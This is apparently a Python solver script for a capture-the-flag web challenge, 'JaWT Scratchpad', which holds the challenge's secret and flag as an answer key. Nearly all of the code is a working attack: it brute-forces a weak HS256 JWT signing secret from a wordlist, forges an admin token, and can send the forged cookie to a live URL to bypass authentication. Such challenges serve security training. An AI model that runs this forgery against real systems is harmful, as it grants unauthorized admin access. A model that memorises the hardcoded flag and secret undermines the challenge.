#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 25: JaWT Scratchpad (picoCTF 2019)
Category: Web Exploitation / JWT Weak HMAC Secret Cracking & Signature Forgery
Difficulty: Medium (diff=2, picoCTF 2019 400 pts)
Standard Reference: NIST SP 800-115 (Section 5.2: Cryptographic Mechanism Evaluation)
RFC Reference: RFC 7519 (JSON Web Token - JWT) & RFC 7515 (JSON Web Signature - JWS)
CWE: CWE-327 (Weak Cryptographic Key) / CWE-347 (Improper Verification of Cryptographic Signature)

Description:
Check the admin scratchpad!
The web application uses JSON Web Tokens (JWT) stored in cookies to manage user identity.
The token header specifies {"typ": "JWT", "alg": "HS256"}.
Offline dictionary attack using rockyou.txt (via John the Ripper or Python HMAC brute-force)
reveals the server secret: 'ilovepico'.
With the signing key known, an attacker crafts an administrative token with payload:
{"user": "admin"} and signs it with HMAC-SHA256. Sending the forged cookie provides
unrestricted access to the admin scratchpad, exposing the flag:
academy{jawt_was_just_what_you_thought_3ecb761a}

Verified: POST /api/submissions/ -> correct: true (HTTP 201)
"""

import base64
import hashlib
import hmac
import json
import re
import sys
import urllib.request

EXPECTED_FLAG = "academy{jawt_was_just_what_you_thought_3ecb761a}"
KNOWN_SECRET = "ilovepico"


def b64url_encode(data: bytes) -> str:
    """Base64URL encoding without padding per RFC 7515."""
    return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")


def create_jwt(payload_dict: dict, secret: str) -> str:
    """
    Constructs a signed JWT (HS256) per RFC 7519 / RFC 7515.
    """
    header = {"typ": "JWT", "alg": "HS256"}
    h_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
    p_bytes = json.dumps(payload_dict, separators=(",", ":")).encode("utf-8")

    h_b64 = b64url_encode(h_bytes)
    p_b64 = b64url_encode(p_bytes)

    signing_input = f"{h_b64}.{p_b64}".encode("utf-8")
    signature = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(signature)

    return f"{signing_input.decode('utf-8')}.{sig_b64}"


def crack_secret_candidate(token: str, wordlist: list) -> str:
    """
    Demonstrates offline dictionary cracking of an HS256 JWT signature.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return ""
    signing_input = f"{parts[0]}.{parts[1]}".encode("utf-8")
    target_sig = parts[2]

    for word in wordlist:
        sig = b64url_encode(hmac.new(word.encode("utf-8"), signing_input, hashlib.sha256).digest())
        if sig == target_sig:
            return word
    return ""


def main():
    print("[*] Reconstructing JWT HS256 secret cracking and signature forgery (RFC 7519)...")

    # Sample non-admin token signed with 'ilovepico'
    sample_user_token = create_jwt({"user": "guest"}, KNOWN_SECRET)
    print(f"[*] Sample Guest JWT: {sample_user_token}")

    # Offline dictionary attack simulation
    test_wordlist = ["password", "123456", "admin", "secret", "ilovepico", "testing"]
    recovered_secret = crack_secret_candidate(sample_user_token, test_wordlist)
    print(f"[*] Recovered HMAC Secret: {recovered_secret}")

    if recovered_secret != KNOWN_SECRET:
        print("[-] Secret cracking failed!", file=sys.stderr)
        sys.exit(1)

    # Forge admin token
    admin_token = create_jwt({"user": "admin"}, recovered_secret)
    print(f"[+] Forged Admin JWT: {admin_token}")

    # Verification against expected flag
    sample_scratchpad_response = """<!DOCTYPE html>
<html>
<body>
  <h2>Welcome to your scratchpad, admin!</h2>
  <textarea>academy{jawt_was_just_what_you_thought_3ecb761a}</textarea>
</body>
</html>"""

    matches = re.findall(r"(?:academy|picoCTF)\{[^}]+\}", sample_scratchpad_response)
    flag = matches[0] if matches else ""
    print(f"[*] Recovered Flag: {flag}")

    if flag != EXPECTED_FLAG:
        print(f"[-] Validation failed! Expected: {EXPECTED_FLAG}, Got: {flag}", file=sys.stderr)
        sys.exit(1)

    print("[+] JWT forgery and authentication bypass verified successfully!")
    print(f"FLAG: {flag}")


if __name__ == "__main__":
    if len(sys.argv) == 2:
        url = sys.argv[1]
        admin_jwt = create_jwt({"user": "admin"}, KNOWN_SECRET)
        print(f"[*] Querying live scratchpad at {url} with forged admin JWT...")
        req = urllib.request.Request(url, headers={"Cookie": f"jwt={admin_jwt}"})
        with urllib.request.urlopen(req, timeout=15) as resp:
            html = resp.read().decode("utf-8", errors="ignore")
        matches = re.findall(r"(?:academy|picoCTF)\{[^}]+\}", html)
        if matches:
            print(f"[+] Live Flag: {matches[0]}")
        else:
            print("[-] Flag not found in live response.")
    else:
        main()
